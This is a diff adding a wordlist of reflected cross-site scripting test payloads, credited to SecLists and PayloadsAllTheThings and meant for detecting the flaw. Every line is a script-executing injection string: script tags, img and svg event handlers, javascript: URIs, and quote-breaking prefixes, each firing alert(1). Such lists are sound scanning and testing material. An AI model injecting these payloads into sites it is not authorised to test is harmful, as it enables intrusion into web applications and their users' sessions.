@@ -1,0 +1,34 @@
+# XSS Reflected Payloads
+# Sources: SecLists, PayloadsAllTheThings
+# Purpose: Detect reflected cross-site scripting by injecting executable markup.
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<script>alert(document.domain)</script>
+<ScRiPt>alert(1)</ScRiPt>
+<SCRIPT>alert(1)</SCRIPT>
+<script src=javascript:alert(1)></script>
+<img src=x onerror=alert(1)>
+<img src=x onerror=alert('XSS')>
+<img src=1 onerror=alert(1)>
+<img/src=x onerror=alert(1)>
+<img src onerror=alert(1)>
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<svg onload="alert(1)">
+<svg><script>alert(1)</script></svg>
+<body onload=alert(1)>
+<input autofocus onfocus=alert(1)>
+<select autofocus onfocus=alert(1)>
+<textarea autofocus onfocus=alert(1)>
+<iframe onload=alert(1)>
+<iframe src=javascript:alert(1)>
+<video src=x onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<details open ontoggle=alert(1)>
+<marquee onstart=alert(1)>
+<object data=javascript:alert(1)>
+"><script>alert(1)</script>
+'><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+'><img src=x onerror=alert(1)>
+<script>alert(String.fromCharCode(88,83,83))</script>
